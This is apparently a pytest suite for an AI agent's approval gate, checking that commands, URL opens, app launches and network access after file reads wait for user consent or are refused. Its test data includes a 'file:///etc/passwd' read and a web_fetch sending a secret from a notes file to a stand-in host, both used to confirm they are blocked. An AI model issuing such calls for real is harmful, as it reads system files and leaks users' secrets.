import json
import signal

from conftest import parse_events, started
from test_tools import answer, call, completion

USER = {"messages": [{"role": "user", "content": "do it"}]}
CAPS = {"hermes3:8b": ["completion", "tools"]}
ACCEPT = {"type": "request.resolve", "id": "q1", "decision": "accept"}
DECLINE = {"type": "request.resolve", "id": "q1", "decision": "decline"}


def of_type(events, t):
    return [e for e in events if e["type"] == t]


def test_command_waits_for_accept(run_agent):
    events, _ = run_agent(USER, [[call("run_command", {"command": "echo hi"}), {"done": True}], answer()],
                          caps=CAPS, stdin_lines=[ACCEPT])
    item = started(events, "command_execution")[0]
    opened = of_type(events, "request.opened")[0]
    resolved = of_type(events, "request.resolved")[0]
    done = completion(events, item["id"])
    assert events.index(item) < events.index(opened) < events.index(resolved) < events.index(done)
    assert opened["id"] == "q1" and opened["itemId"] == item["id"] and opened["kind"] == "command"
    assert opened["detail"] == "echo hi"
    assert resolved["decision"] == "accept"
    assert done["status"] == "completed" and "hi" in done["output"]


def test_decline_never_runs(run_agent, tmp_path):
    events, fake = run_agent(
        USER, [[call("run_command", {"command": f"touch {tmp_path}/flag"}), {"done": True}], answer()],
        caps=CAPS, stdin_lines=[DECLINE])
    assert not (tmp_path / "flag").exists()
    item = started(events, "command_execution")[0]
    assert completion(events, item["id"])["status"] == "declined"
    assert fake.requests[1]["messages"][-1]["content"].startswith("The user declined this command. Don't run it again")


def test_timeout_declines(run_agent, tmp_path):
    events, _ = run_agent(
        USER, [[call("run_command", {"command": f"touch {tmp_path}/flag"}), {"done": True}], answer()],
        caps=CAPS, env={"KUWAI_AGENT_APPROVAL_TIMEOUT": "1"})
    assert of_type(events, "request.resolved")[0]["decision"] == "timeout"
    assert completion(events, started(events, "command_execution")[0]["id"])["status"] == "declined"
    assert not (tmp_path / "flag").exists()


def test_cancel_while_pending_declines(start_agent, tmp_path):
    script = [[call("run_command", {"command": f"touch {tmp_path}/flag"}), {"done": True}], answer()]
    with start_agent({"messages": [{"role": "user", "content": "run it in the terminal"}]}, script, CAPS) as (proc, _):
        lines = []
        for line in proc.stdout:
            lines.append(line)
            if json.loads(line)["type"] == "request.opened":
                break
        proc.send_signal(signal.SIGTERM)
        out, _ = proc.communicate(timeout=10)
        events = parse_events("".join(lines) + out)
    assert proc.returncode == 0
    assert not (tmp_path / "flag").exists()
    assert of_type(events, "request.resolved")[0]["decision"] == "decline"
    assert events[-1]["type"] == "turn.completed" and events[-1]["status"] == "interrupted"


def test_open_url_rejects_file_scheme(run_agent, tmp_path):
    events, _ = run_agent(USER, [[call("open_url", {"url": "file:///etc/passwd"}), {"done": True}], answer()],
                          caps=CAPS)
    assert of_type(events, "request.opened") == []
    tool = [e for e in events if e["type"] == "item.started" and e["itemType"] == "dynamic_tool_call"][0]
    assert completion(events, tool["id"])["status"] == "failed"
    assert not (tmp_path / "launched").exists()


def test_open_url_after_accept(run_agent, tmp_path):
    run_agent(USER, [[call("open_url", {"url": "https://example.com"}), {"done": True}], answer()],
              caps=CAPS, stdin_lines=[ACCEPT])
    assert (tmp_path / "launched").read_text().strip() == "xdg-open https://example.com"


def test_launch_app_resolves_desktop_id(run_agent, tmp_path):
    apps = tmp_path / ".local/share/applications"
    apps.mkdir(parents=True)
    (apps / "org.example.ZebraNotes.desktop").write_text("[Desktop Entry]\nType=Application\nName=Zebra Notes\nExec=zebra\n")
    events, _ = run_agent(USER, [[call("launch_app", {"name": "zebra"}), {"done": True}], answer()],
                          caps=CAPS, stdin_lines=[ACCEPT], env={"XDG_DATA_HOME": str(tmp_path / ".local/share")})
    opened = of_type(events, "request.opened")[0]
    assert opened["kind"] == "launch" and opened["summary"] == "Open Zebra Notes"
    assert (tmp_path / "launched").read_text().strip() == "gtk-launch org.example.ZebraNotes"


def test_a_tool_not_offered_for_the_request_is_refused(start_agent, tmp_path):
    script = [[call("run_command", {"command": f"touch {tmp_path}/flag"}), {"done": True}], answer()]
    with start_agent(USER, script, CAPS) as (proc, _):
        out, _ = proc.communicate(timeout=30)
    events = parse_events(out)
    assert not (tmp_path / "flag").exists()
    assert of_type(events, "request.opened") == []
    item = started(events, "command_execution")[0]
    assert "wasn't offered" in completion(events, item["id"])["output"]


def test_going_online_after_reading_your_files_asks_first(run_agent, tmp_path):
    secret = tmp_path / "notes.txt"
    secret.write_text("the launch code is 1234\n")
    events, fake = run_agent(USER, [[call("read", {"path": str(secret)}), {"done": True}],
                                    [call("web_fetch", {"url": "https://example.invalid/?d=1234"}), {"done": True}],
                                    answer()], caps=CAPS, stdin_lines=[DECLINE])
    opened = of_type(events, "request.opened")
    assert len(opened) == 1 and opened[0]["kind"] == "network"
    assert "example.invalid" in opened[0]["detail"]
    assert of_type(events, "request.resolved")[0]["decision"] == "decline"


def test_going_online_before_reading_anything_does_not_ask(run_agent):
    events, _ = run_agent(USER, [[call("web_search", {"query": "weather"}), {"done": True}], answer()], caps=CAPS)
    assert of_type(events, "request.opened") == []
